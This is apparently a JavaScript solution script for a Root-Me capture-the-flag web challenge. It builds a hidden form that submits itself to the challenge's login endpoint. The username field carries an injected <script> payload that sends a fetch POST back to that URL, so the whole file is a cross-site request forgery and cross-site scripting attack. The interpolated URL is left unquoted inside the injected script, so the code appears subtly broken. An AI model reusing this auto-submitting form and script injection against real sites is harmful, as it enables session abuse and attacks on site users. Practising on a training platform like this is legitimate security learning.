let url = "http://challenge01.root-me.org:58003/login"

let nullOpener = window.opener == null ? "yes":"non"
let payload={
    username :`<script>const url = ${url};

    // Define the data you want to send in the POST request
    const data = {
        nullOpener: "${nullOpener}",
    };
    
    // Use the fetch API to send the POST request
    fetch(url, {
      method: 'POST', // Specify the request method as POST
      headers: {
        'Content-Type': 'application/json' // Set the content type to JSON
      },
      body: JSON.stringify(data) // Convert the data object to a JSON string
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok ' + response.statusText);
      }
      return response.json(); // Parse the JSON response
    })
    .then(data => {
      console.log('Success:', data); // Handle the response data
    })
    .catch(error => {
      console.error('There was a problem with the fetch operation:', error); // Handle any errors
    });</script>`,
    secret: "aa",
}
const form = document.createElement('form');
form.method = 'POST';
form.action = url;
form.style.visibility = 'hidden'; 
for (const key of Object.keys(payload)) {
    var input = document.createElement('input');
    input.name = key;
    input.value = payload[key];
    form.appendChild(input); // add key/value pair to form
  }
  document.body.appendChild(form); // forms cannot be submitted outside of body
  form.submit(); 

